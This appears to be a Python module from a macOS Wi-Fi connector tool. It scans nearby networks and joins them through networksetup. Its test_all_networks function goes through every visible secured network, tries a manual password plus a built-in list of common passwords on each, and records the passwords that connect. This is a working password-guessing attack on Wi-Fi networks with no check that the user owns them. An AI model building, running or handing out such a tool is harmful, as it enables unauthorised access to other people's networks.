from __future__ import annotations

import asyncio
import json
import re
import time
from collections.abc import Callable
from typing import Any

from pydantic import ValidationError

from wifi_connector.models import (
    JoinRequest,
    JoinResult,
    SecurityKind,
    TestAllProgress,
    TestAllResult,
    WifiNetwork,
)
from wifi_connector.password_config import common_test_passwords, get_password_config
from wifi_connector.scanner import (
    associate_with_network,
    location_hint,
    prepare_password_verification,
    read_current_ssid,
    scan_nearby_networks,
)

_HARDWARE_PORT_RE = re.compile(
    r"Hardware Port:\s*(?P<port>.+)\nDevice:\s*(?P<device>en\d+)",
    re.MULTILINE,
)
_CONNECTION_WAIT_SECONDS = 12.0
_CONNECTION_POLL_INTERVAL_SECONDS = 0.5
_FAST_CONNECTION_WAIT_SECONDS = 10.0
_FAST_CONNECTION_POLL_INTERVAL_SECONDS = 0.25
_JOIN_FAILURE_HINTS = (
    "could not",
    "couldn't",
    "failed",
    "incorrect",
    "wrong",
    "denied",
    "unable",
    "invalid",
    "not find",
    "error",
)


def default_password() -> str:
    return get_password_config().default_password


def get_common_test_passwords() -> tuple[str, ...]:
    return common_test_passwords()


def build_test_passwords(manual_password: str, *, include_common: bool = True) -> list[str]:
    ordered: list[str] = []
    seen: set[str] = set()
    candidates: list[str] = []
    stripped = manual_password.strip()
    if stripped:
        candidates.append(stripped)
    if include_common:
        candidates.extend(get_common_test_passwords())

    for candidate in candidates:
        if len(candidate) < 8 or len(candidate) > 63:
            continue
        if candidate in seen:
            continue
        seen.add(candidate)
        ordered.append(candidate)
    return ordered


def _command_indicates_join_started(returncode: int, output: str) -> bool:
    if returncode != 0:
        return False
    lowered = output.lower()
    return not any(hint in lowered for hint in _JOIN_FAILURE_HINTS)


async def _run_command(*args: str) -> tuple[int, str, str]:
    process = await asyncio.create_subprocess_exec(
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout_bytes, stderr_bytes = await process.communicate()
    return (
        process.returncode or 0,
        stdout_bytes.decode("utf-8", errors="replace"),
        stderr_bytes.decode("utf-8", errors="replace"),
    )


def _security_from_label(label: str | None) -> SecurityKind:
    if not label:
        return SecurityKind.UNKNOWN
    lowered = label.lower()
    if "none" in lowered or "open" in lowered:
        return SecurityKind.OPEN
    if "enterprise" in lowered or "802.1x" in lowered:
        return SecurityKind.ENTERPRISE
    if "wpa" in lowered or "wep" in lowered or "personal" in lowered:
        return SecurityKind.PERSONAL
    return SecurityKind.UNKNOWN


def _as_dict_list(value: Any) -> list[dict[str, Any]]:
    if isinstance(value, list):
        return [item for item in value if isinstance(item, dict)]
    if isinstance(value, dict):
        return [value]
    return []


async def resolve_wifi_interface(preferred: str | None = None) -> str:
    if preferred:
        return preferred

    returncode, stdout, stderr = await _run_command("networksetup", "-listallhardwareports")
    if returncode != 0:
        raise RuntimeError(stderr.strip() or "Failed to list hardware ports")

    for match in _HARDWARE_PORT_RE.finditer(stdout):
        port_name = match.group("port").strip().lower()
        if port_name in {"wi-fi", "wifi", "airport"}:
            return match.group("device")

    raise RuntimeError("Wi-Fi interface was not found")


def _parse_networks(profile: dict[str, Any]) -> list[WifiNetwork]:
    entries = profile.get("SPAirPortDataType") or []
    networks: dict[str, WifiNetwork] = {}

    for entry in _as_dict_list(entries):
        for interface in _as_dict_list(entry.get("spairport_airport_interfaces")):
            current = interface.get("spairport_current_network_information")
            if isinstance(current, dict):
                ssid = str(current.get("_name") or "").strip()
                if ssid:
                    networks[ssid] = WifiNetwork(
                        ssid=ssid,
                        security=_security_from_label(current.get("spairport_security_mode")),
                        rssi_dbm=_as_optional_int(current.get("spairport_signal_noise")),
                        is_current=True,
                    )

            others = interface.get("spairport_airport_other_local_wireless_networks")
            for other in _as_dict_list(others):
                ssid = str(other.get("_name") or "").strip()
                if not ssid or ssid in networks:
                    continue
                try:
                    networks[ssid] = WifiNetwork(
                        ssid=ssid,
                        security=_security_from_label(other.get("spairport_security_mode")),
                        rssi_dbm=_as_optional_int(other.get("spairport_signal_noise")),
                        is_current=False,
                    )
                except ValidationError:
                    continue

    return list(networks.values())


def _merge_networks(*groups: list[WifiNetwork]) -> list[WifiNetwork]:
    merged: dict[str, WifiNetwork] = {}
    for group in groups:
        for network in group:
            existing = merged.get(network.ssid)
            if existing is None:
                merged[network.ssid] = network
                continue
            is_stronger = (network.rssi_dbm or -999) > (existing.rssi_dbm or -999)
            merged[network.ssid] = existing.model_copy(
                update={
                    "is_current": existing.is_current or network.is_current,
                    "rssi_dbm": network.rssi_dbm if is_stronger else existing.rssi_dbm,
                    "security": (
                        network.security
                        if existing.security == SecurityKind.UNKNOWN
                        else existing.security
                    ),
                }
            )
    return sorted(
        merged.values(),
        key=lambda item: (not item.is_current, -(item.rssi_dbm or -999), item.ssid.lower()),
    )


def _as_optional_int(value: Any) -> int | None:
    if value is None:
        return None
    if isinstance(value, int):
        return value
    text = str(value)
    match = re.search(r"-?\d+", text)
    return int(match.group()) if match else None


async def _system_profiler_networks() -> list[WifiNetwork]:
    returncode, stdout, stderr = await _run_command(
        "system_profiler",
        "SPAirPortDataType",
        "-json",
    )
    if returncode != 0:
        raise RuntimeError(stderr.strip() or "Failed to read Wi-Fi profile")

    try:
        profile = json.loads(stdout)
    except json.JSONDecodeError as error:
        raise RuntimeError("system_profiler returned invalid JSON") from error

    return _parse_networks(profile)


async def list_visible_networks() -> tuple[list[WifiNetwork], str | None]:
    scanned, status = scan_nearby_networks()
    try:
        profiled = await _system_profiler_networks()
    except RuntimeError:
        profiled = []

    networks = _merge_networks(scanned, profiled)
    return networks, location_hint(status)


async def _wait_for_ssid(
    interface: str,
    ssid: str,
    *,
    timeout_seconds: float,
    poll_interval_seconds: float,
) -> bool:
    deadline = time.perf_counter() + timeout_seconds
    while True:
        if await _read_current_ssid(interface) == ssid:
            return True
        remaining = deadline - time.perf_counter()
        if remaining <= 0:
            return False
        await asyncio.sleep(min(poll_interval_seconds, remaining))


async def _join_via_networksetup(
    request: JoinRequest,
    interface: str,
    *,
    fast_verify: bool,
    verify_password: bool,
) -> JoinResult:
    if verify_password:
        await asyncio.to_thread(prepare_password_verification, request.ssid)

    returncode, stdout, stderr = await _run_command(
        "networksetup",
        "-setairportnetwork",
        interface,
        request.ssid,
        request.password,
    )
    output = (stdout + "\n" + stderr).strip()
    command_has_succeeded = _command_indicates_join_started(returncode, output)
    is_connected = False

    if command_has_succeeded:
        if await _read_current_ssid(interface) == request.ssid:
            is_connected = True
        else:
            timeout_seconds = (
                _FAST_CONNECTION_WAIT_SECONDS
                if fast_verify
                else _CONNECTION_WAIT_SECONDS
            )
            poll_interval_seconds = (
                _FAST_CONNECTION_POLL_INTERVAL_SECONDS
                if fast_verify
                else _CONNECTION_POLL_INTERVAL_SECONDS
            )
            is_connected = await _wait_for_ssid(
                interface,
                request.ssid,
                timeout_seconds=timeout_seconds,
                poll_interval_seconds=poll_interval_seconds,
            )

    if is_connected:
        output = f"Підключено до {request.ssid}"
    elif command_has_succeeded:
        output = (
            f"Не вдалося підтвердити підключення до {request.ssid}: "
            "поточна Wi‑Fi мережа не змінилася."
        )
    elif not output:
        output = f"Не вдалося підключитися до {request.ssid}"

    return JoinResult(
        is_connected=is_connected,
        ssid=request.ssid,
        interface=interface,
        message=output,
        password=request.password if is_connected else None,
    )


async def join_network(
    request: JoinRequest,
    *,
    fast_verify: bool = False,
    verify_password: bool = False,
) -> JoinResult:
    interface = await resolve_wifi_interface(request.interface)
    is_connected, message = await asyncio.to_thread(
        associate_with_network,
        request.ssid,
        request.password,
        verify_password=verify_password,
    )

    if is_connected is True:
        return JoinResult(
            is_connected=True,
            ssid=request.ssid,
            interface=interface,
            message=f"Підключено до {request.ssid}",
            password=request.password,
        )

    if is_connected is False:
        return JoinResult(
            is_connected=False,
            ssid=request.ssid,
            interface=interface,
            message=message or f"Не вдалося підключитися до {request.ssid}",
            password=None,
        )

    return await _join_via_networksetup(
        request,
        interface,
        fast_verify=fast_verify,
        verify_password=verify_password,
    )


async def test_all_networks(
    networks: list[WifiNetwork],
    passwords: list[str],
    *,
    on_progress: Callable[[TestAllProgress], None] | None = None,
    should_stop: Callable[[], bool] | None = None,
) -> TestAllResult:
    if not passwords:
        raise ValueError("At least one password is required")

    interface = await resolve_wifi_interface(None)
    testable = [network for network in networks if network.security != SecurityKind.OPEN]
    results: list[JoinResult] = []
    total = len(testable)
    password_total = len(passwords)
    started_at = time.perf_counter()
    was_stopped = False

    for index, network in enumerate(testable, start=1):
        if should_stop is not None and should_stop():
            was_stopped = True
            break

        network_connected = False
        final_result: JoinResult | None = None

        def emit_progress(
            *,
            is_active: bool,
            password: str | None = None,
            password_index: int = 0,
        ) -> None:
            if on_progress is None:
                return
            elapsed_seconds = time.perf_counter() - started_at
            completed_count = len(results)
            average_seconds = (
                elapsed_seconds / completed_count if completed_count else 0.0
            )
            on_progress(
                TestAllProgress(
                    current=index,
                    total=total,
                    ssid=network.ssid,
                    elapsed_seconds=elapsed_seconds,
                    average_seconds_per_network=average_seconds,
                    completed=list(results),
                    is_active=is_active,
                    latest_result=results[-1] if results and not is_active else None,
                    successful=[item for item in results if item.is_connected],
                    password_current=password_index,
                    password_total=password_total,
                    current_password=password if is_active else None,
                )
            )

        for password_index, password in enumerate(passwords, start=1):
            if should_stop is not None and should_stop():
                was_stopped = True
                break

            emit_progress(
                is_active=True,
                password=password,
                password_index=password_index,
            )
            request = JoinRequest(ssid=network.ssid, password=password, interface=interface)
            join_result = await join_network(
                request,
                fast_verify=True,
                verify_password=True,
            )
            if join_result.is_connected:
                results.append(join_result)
                network_connected = True
                emit_progress(
                    is_active=False,
                    password=password,
                    password_index=password_index,
                )
                break
            final_result = join_result
            emit_progress(
                is_active=False,
                password=password,
                password_index=password_index,
            )

        if was_stopped:
            break

        if not network_connected and final_result is not None:
            results.append(final_result)

    elapsed_seconds = time.perf_counter() - started_at
    completed = len(results)
    average_seconds = elapsed_seconds / completed if completed else 0.0
    return TestAllResult(
        results=results,
        elapsed_seconds=elapsed_seconds,
        average_seconds_per_network=average_seconds,
        was_stopped=was_stopped,
    )


async def _read_current_ssid(interface: str) -> str | None:
    ssid = await asyncio.to_thread(read_current_ssid)
    if ssid:
        return ssid

    returncode, stdout, stderr = await _run_command(
        "networksetup",
        "-getairportnetwork",
        interface,
    )
    if returncode != 0:
        raise RuntimeError(stderr.strip() or "Failed to read current network")

    prefix = "Current Wi-Fi Network: "
    line = stdout.strip()
    if line.startswith(prefix):
        resolved = line[len(prefix) :].strip()
        return resolved or None
    if "you are not associated" in line.lower():
        return None
    return None


async def current_ssid(interface: str | None = None) -> str | None:
    wifi_interface = await resolve_wifi_interface(interface)
    return await _read_current_ssid(wifi_interface)
